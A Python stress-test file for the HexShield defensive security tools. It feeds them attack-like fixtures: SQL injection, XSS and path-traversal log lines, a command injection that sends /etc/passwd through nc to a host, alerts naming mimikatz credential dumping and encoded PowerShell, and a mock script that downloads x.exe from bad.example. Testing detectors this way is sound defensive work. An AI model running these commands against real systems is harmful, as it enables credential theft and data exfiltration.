"""Rigorous stress tests for HexShield defensive tools.

Run:  python tests/test_rigorous.py
Covers adversarial inputs, edge cases, false-positive control, and real files.
"""

from __future__ import annotations

import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from hexshield.tools.registry import ToolRegistry  # noqa: E402
from hexshield.tools.register_all import *  # noqa: F401,F403,E402

PASS = 0
FAIL = 0
FAILURES = []


def check(name: str, cond: bool, detail: str = "") -> None:
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  PASS  {name}")
    else:
        FAIL += 1
        FAILURES.append(f"{name}: {detail}")
        print(f"  FAIL  {name}  -- {detail}")


def run_tool(name: str, target: str, **kwargs):
    return ToolRegistry.get(name).run(target, **kwargs)


# ---------------------------------------------------------------------------
print("=" * 70)
print("1. parse_logs — adversarial & edge cases")
print("=" * 70)

def mklog(lines):
    f = tempfile.NamedTemporaryFile("w", suffix=".log", delete=False, encoding="utf-8")
    f.write("\n".join(lines))
    f.close()
    return f.name


# 1a. obfuscated SQLi / XSS that should be caught
obf = [
    "2026-01-01 12:00:00 web[1]: GET /search?q=%27%20OR%201%3D1%20--%20 HTTP/1.1 200",
    "2026-01-01 12:00:01 web[1]: GET /x.php?u=admin'%3bDROP%20TABLE%20users%3b-- HTTP/1.1 200",
    "2026-01-01 12:00:02 web[1]: POST /comment <script>alert(1)</script>",
    "2026-01-01 12:00:03 web[1]: GET /../../../../etc/shadow HTTP/1.1 404",
    "2026-01-01 12:00:04 web[1]: GET /%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1 404",
    "2026-01-01 12:00:05 sshd[2]: Failed password for invalid user admin from 10.0.0.9 port 22 ssh2",
    "2026-01-01 12:00:06 sshd[2]: Failed password for invalid user admin from 10.0.0.9 port 22 ssh2",
    "2026-01-01 12:00:07 sshd[2]: Failed password for invalid user admin from 10.0.0.9 port 22 ssh2",
    "2026-01-01 12:00:08 sshd[2]: Failed password for invalid user admin from 10.0.0.9 port 22 ssh2",
    "2026-01-01 12:00:09 sshd[2]: Failed password for invalid user admin from 10.0.0.9 port 22 ssh2",
    "2026-01-01 12:00:10 web[1]: GET /cmd.php?c=cat%20/etc/passwd%20%7C%20nc%2010.0.0.9%204444 HTTP/1.1 200",
]
f = mklog(obf)
r = run_tool("parse_logs", f)
os.unlink(f)
sev_types = {x["type"] for x in r.findings}
check("obfuscated sqli caught", any("sqli" in t for t in sev_types), f"types={sev_types}")
check("xss caught", any("xss" in t for t in sev_types), f"types={sev_types}")
check("path traversal caught (..%2f)", any("traversal" in t for t in sev_types), f"types={sev_types}")
check("auth brute-force flagged high count", sum(1 for x in r.findings if x["type"] == "auth failure") >= 5, "need >=5 auth failures")
check("command injection caught", any("injection" in t for t in sev_types), f"types={sev_types}")
check("overall severity high or critical", r.severity in ("high", "critical"), r.severity)

# 1b. benign traffic should NOT trigger
benign = [
    "2026-01-01 12:00:00 web[1]: GET /index.html HTTP/1.1 200",
    "2026-01-01 12:00:01 web[1]: GET /css/site.css HTTP/1.1 200",
    "2026-01-01 12:00:02 web[1]: GET /js/app.js HTTP/1.1 304",
    "2026-01-01 12:00:03 web[1]: POST /api/login HTTP/1.1 200",
    "2026-01-01 12:00:04 web[1]: GET /favicon.ico HTTP/1.1 404",
    "2026-01-01 12:00:05 cron[3]: run-parts /etc/cron.daily executed",
    "2026-01-01 12:00:06 kernel[4]: eth0: link up",
]
f = mklog(benign)
r = run_tool("parse_logs", f)
os.unlink(f)
check("benign log produces zero findings", len(r.findings) == 0, f"{len(r.findings)} findings")

# 1c. huge file performance + cap
big = ["2026-01-01 12:00:00 sshd[1]: Failed password for root from 203.0.113.1 port 22 ssh2"] * 50_000
f = mklog(big)
import time
t0 = time.time()
r = run_tool("parse_logs", f, max_lines=5000)
dt = time.time() - t0
os.unlink(f)
check("50k-line file parsed within 5s", dt < 5, f"{dt:.2f}s")
check("max_lines cap respected", r.raw["parsed_lines"] == 5000, str(r.raw["parsed_lines"]))

# 1d. empty file
f = mklog([])
r = run_tool("parse_logs", f)
os.unlink(f)
check("empty log -> ok, zero findings", r.status == "ok" and len(r.findings) == 0, f"{r.status}")

# 1e. nonexistent file raises
try:
    run_tool("parse_logs", "C:/definitely/not/here.log")
    check("missing file raises", False, "no exception")
except FileNotFoundError:
    check("missing file raises", True)

# ---------------------------------------------------------------------------
print("=" * 70)
print("2. triage_alert — adversarial & multi-stage TTPs")
print("=" * 70)

# 2a. sophisticated multi-stage kill chain
multi = (
    "User jdoe received phishing email with attachment invoice.scr. "
    "On open, powershell.exe -enc SQBFAFgA ran. Event 4688 shows cmd.exe /c "
    "whoami /priv, then schtasks /create /tn updater /tr C:\\Windows\\temp\\x.exe. "
    "Network: outbound TLS to 185.220.101.42 on 443, data exfil via ftp put."
)
r = run_tool("triage_alert", multi)
ttp = set(r.raw.get("ttp_hints", []))
check("phishing detected", any("Phishing" in t for t in ttp), str(ttp))
check("lotl execution detected", any("Living-off" in t for t in ttp), str(ttp))
check("exfiltration detected", any("Exfil" in t for t in ttp), str(ttp))
check("severity critical for kill chain", r.severity == "critical", r.severity)

# 2b. credential-theft keywords
r = run_tool("triage_alert", "lsass dump via mimikatz sekurlsa::logonpasswords then kerberoasting")
ttp = set(r.raw.get("ttp_hints", []))
check("mimikatz/cred theft detected", any("Credential" in t for t in ttp), str(ttp))
check("kerberoast detected", any("Credential" in t for t in ttp), str(ttp))

# 2c. benign alert -> low severity
r = run_tool("triage_alert", "User logged in successfully via VPN from known office range. MFA approved.")
check("benign alert stays low", r.severity == "info", r.severity)

# 2d. sql injection alert
r = run_tool("triage_alert", "SQL injection attempt blocked by WAF: /product.php?id=1' OR 1=1--")
ttp = set(r.raw.get("ttp_hints", []))
check("sqli detected", any("SQL" in t for t in ttp), str(ttp))

# ---------------------------------------------------------------------------
print("=" * 70)
print("3. ioc_lookup — edge cases & overlap")
print("=" * 70)

# 3a. extraction from mixed text
txt = (
    "src 10.1.2.3 -> 8.8.8.8, also 172.16.0.1. Domain evil.example.net "
    "and C2 c2.badco.io. file 44d88612fea8a8f36de82e1278abb02f (md5). "
    "contact sos@dark.com CVE-2023-23397 and CVE-2024-3400"
)
r = run_tool("ioc_lookup", txt)
raw = r.raw
check("public IP extracted", "8.8.8.8" in raw["ips"], str(raw["ips"]))
check("private IP flagged low", any(x["type"] == "private_ip" for x in r.findings), str(raw["ips"]))
check("md5 hash extracted", "44d88612fea8a8f36de82e1278abb02f" in raw["hashes"], str(raw["hashes"]))
check("both CVEs extracted", len(raw["cves"]) == 2, str(raw["cves"]))
check("email extracted", "sos@dark.com" in raw["emails"], str(raw["emails"]))
check("domain extracted", "c2.badco.io" in raw["domains"], str(raw["domains"]))

# 3b. file source
f = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False, encoding="utf-8")
f.write(txt)
f.close()
r = run_tool("ioc_lookup", f.name, source="file")
os.unlink(f.name)
check("file source works", "8.8.8.8" in r.raw["ips"], str(r.raw["ips"]))

# 3c. no IOCs
r = run_tool("ioc_lookup", "just some ordinary prose about the weather today")
check("no IOCs -> ok", r.status == "ok" and len(r.findings) == 0, f"{r.status}")

# 3d. domain regex should not swallow TLD-only
r = run_tool("ioc_lookup", "host www.example.com visited")
check("single domain extracted", "www.example.com" in r.raw["domains"], str(r.raw["domains"]))

# ---------------------------------------------------------------------------
print("=" * 70)
print("4. file_triage — real binaries & edge cases")
print("=" * 70)

# 4a. triage a real PE file (python.exe on Windows)
candidates = [
    r"C:\Windows\System32\cmd.exe",
    r"C:\Windows\System32\notepad.exe",
    sys.executable,
]
target = next((p for p in candidates if os.path.exists(p)), None)
if target:
    r = run_tool("file_triage", target)
    check("PE detected as binary", "PE" in r.raw.get("detected_type", ""), r.raw.get("detected_type", ""))
    check("sha256 computed", len(r.raw.get("sha256", "")) == 64, str(r.raw.get("sha256", "")))
    check("md5 computed", len(r.raw.get("md5", "")) == 32, str(r.raw.get("md5", "")))
    check("size recorded", r.raw.get("size_bytes", 0) > 0, str(r.raw.get("size_bytes", 0)))
else:
    print("  SKIP  real-PE test (no system binary found)")

# 4b. empty file
f = tempfile.NamedTemporaryFile("wb", suffix=".bin", delete=False)
f.write(b"")
f.close()
r = run_tool("file_triage", f.name)
os.unlink(f.name)
check("empty file -> ok", r.status == "ok", r.status)

# 4c. packed-like high-entropy file
import os as _os
f = tempfile.NamedTemporaryFile("wb", suffix=".bin", delete=False)
f.write(_os.urandom(256 * 1024))  # 256KB random -> high entropy
f.close()
r = run_tool("file_triage", f.name)
os.unlink(f.name)
check("high-entropy file flagged", any(x["type"] == "high_entropy" for x in r.findings), str(r.findings))
check("entropy reported > 7", r.raw.get("entropy_bits_per_byte", 0) > 7, str(r.raw.get("entropy_bits_per_byte")))

# 4d. text file with suspicious strings (simulated script)
f = tempfile.NamedTemporaryFile("w", suffix=".ps1", delete=False, encoding="utf-8")
f.write("powershell -enc SQBFAFgA; Invoke-WebRequest http://bad.example/x.exe -OutFile $env:TEMP\\x.exe; schtasks /create")
f.close()
r = run_tool("file_triage", f.name)
os.unlink(f.name)
check("suspicious strings flagged", any(x["type"] == "suspicious_strings" for x in r.findings), str(r.findings))

# ---------------------------------------------------------------------------
print("=" * 70)
print("5. incident_runbook — fuzzy matching")
print("=" * 70)

for term, expect in [
    ("ransomware", "ransomware"),
    ("RANSOMWARE ATTACK", "ransomware"),
    ("phishing email", "phishing"),
    ("credential theft", "credential_theft"),
    ("data exfiltration", "exfiltration"),
    ("DDoS", "ddos"),
    ("insider", "insider_threat"),
]:
    r = run_tool("incident_runbook", term)
    check(f"runbook '{term}' -> {expect}", r.target == expect and len(r.findings) > 0, f"{r.target}")

try:
    run_tool("incident_runbook", "alien invasion")
    check("unknown type raises", False, "no exception")
except ValueError:
    check("unknown type raises", True)

# ---------------------------------------------------------------------------
print("=" * 70)
print("6. hardening_check — real system")
print("=" * 70)

r = run_tool("hardening_check", ".")
check("hardening returns findings", len(r.findings) > 0, f"{len(r.findings)} findings")
n_pass = sum(1 for x in r.findings if x["status"] == "pass")
n_fail = sum(1 for x in r.findings if x["status"] == "fail")
n_err = sum(1 for x in r.findings if x["status"] == "error")
check("no check errored (should be robust)", n_err == 0, f"{n_err} errored: {[x for x in r.findings if x['status']=='error'][:2]}")
print(f"  info: {n_pass} pass / {n_fail} fail / {n_err} error")

# ---------------------------------------------------------------------------
print("=" * 70)
print(f"RESULT: {PASS} passed, {FAIL} failed")
print("=" * 70)
if FAILURES:
    print("\nFailures:")
    for f_ in FAILURES:
        print(f"  - {f_}")
    sys.exit(1)
print("ALL TESTS PASSED")